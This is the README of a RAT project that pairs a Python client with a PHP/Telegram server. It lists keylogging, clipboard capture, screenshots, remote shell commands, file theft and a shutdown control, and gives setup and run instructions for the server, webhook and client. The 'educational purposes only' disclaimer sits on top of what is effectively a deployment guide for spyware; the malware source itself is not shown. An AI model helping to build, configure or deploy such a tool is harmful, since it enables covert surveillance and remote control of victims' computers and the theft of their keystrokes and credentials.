# Remote Administration Tool (RAT) Project

## Overview
This project is a Remote Administration Tool (RAT) designed to demonstrate remote system monitoring and control capabilities. It consists of a Python-based client and a PHP-based server that communicate over a network to perform tasks such as keylogging, system information collection, file management, and remote command execution. The server integrates with Telegram for command issuance and data retrieval, using a MySQL database for storage.

> **Note:** This project is for educational and research purposes only. Unauthorized use of such tools on systems without explicit permission is illegal and unethical. The developers assume no responsibility for any misuse or damage caused by this software.

## Project Structure
```
├── commands
│   └── handler.py             # Handles file operations and system commands
├── config.py                  # Client configuration
├── encryption
│   └── manager.py             # Manages AES encryption/decryption
├── main.py                    # Main client script for keylogging and communication
├── monitoring
│   └── logger.py              # Logs keystrokes and clipboard data
├── network
│   └── communicator.py        # Handles network communication with the server
├── output
│   └── project_structure_1.txt  # Project structure dump
├── readme.md                  # This file
├── system
│   └── collector.py           # Collects system information
└── telegram
    ├── api.php                # Server API for handling client requests
    ├── config.php             # Server configuration settings
    ├── crypto.php             # Server-side encryption/decryption
    ├── database.sql           # Database schema for MySQL
    ├── import_sql.php         # Script to import the database schema
    ├── output
    │   └── project_structure_1.txt  # Project structure dump
    ├── telegram_handler.php   # Handles Telegram bot interactions
    └── utils.php              # Server utility functions
```

## Features

- **Keylogging:** Captures keystrokes and clipboard content, sending them to the server at regular intervals.
- **System Monitoring:** Collects system information (OS, hardware, network, etc.).
- **Remote Commands:** Supports commands for file operations (delete, download, upload), system control (shutdown, restart, etc.), and process management.
- **Encryption:** Uses AES-256-CBC for secure communication between the client and server.
- **Telegram Integration:** Allows an authorized admin to interact with the system via a Telegram bot.
- **Database Storage:** Stores client data, commands, and logs in a MySQL database.

## Prerequisites

### Client (Python)
- Python 3.8+
- Required Python packages:
  ```bash
  pip install requests pyperclip psutil cryptography keyboard winreg uuid pyautogui
  ```

### Server (PHP)
- PHP 7.4+
- MySQL 5.7+ or MariaDB
- Web server (e.g., Apache or Nginx)
- Required PHP extensions:
  - pdo_mysql
  - openssl
  - curl
- **Telegram Bot Token** (obtained from BotFather)

## Setup Instructions

### Server Setup

1. **Web Server Configuration:**  
   Host the PHP files located in the `telegram` directory on your web server.

2. **Database Setup:**  
   Create a MySQL database (e.g., `farhamag_logger`):
   ```sql
   CREATE DATABASE farhamag_logger;
   ```
   Import the schema:
   ```bash
   php telegram/import_sql.php
   ```

3. **Telegram Bot Setup:**  
   Update `telegram/config.php` with your bot token and admin chat ID:
   ```php
   public static $BOT_TOKEN = "your_bot_token";
   public static $ADMIN_CHAT_ID = "your_admin_chat_id";
   ```  
   Set the webhook:
   ```bash
   curl -F "url=https://your_server_url/logger/api.php?action=telegram_webhook" https://api.telegram.org/bot<your_bot_token>/setWebhook
   ```

4. **Directory Permissions:**  
   Ensure the `screenshots`, `uploads`, and log directories are writable by the web server.

### Client Setup

1. **Client Configuration:**  
   Update `config.py`:
   ```python
   SERVER_URL = "https://your_server_url/logger/api.php"
   ENCRYPTION_KEY = base64.b64decode("your_base64_key")
   ```

2. **Install Dependencies:**  
   ```bash
   pip install -r requirements.txt
   ```

## Running the Project

### Running the Client
```bash
python main.py
```
- Starts keylogging and clipboard monitoring.
- Periodically sends and retrieves commands.
- Stops when the emergency hotkey (Ctrl+Alt+Shift+K) is pressed.

### Interacting via Telegram
Use the Telegram bot commands:
/start, /screens, /logs, /browse, /get-info, /shutdown, /restart, /sleep, /signout, /cmd <command>, /go <url>, /users, /startup, /tasks

## Security Notes
- **Encryption:** Data is encrypted with AES-256-CBC.
- **Authorization:** Only the admin (specified by `ADMIN_CHAT_ID`) can interact with the bot.
- **SSL:** Enable HTTPS for secure communication.
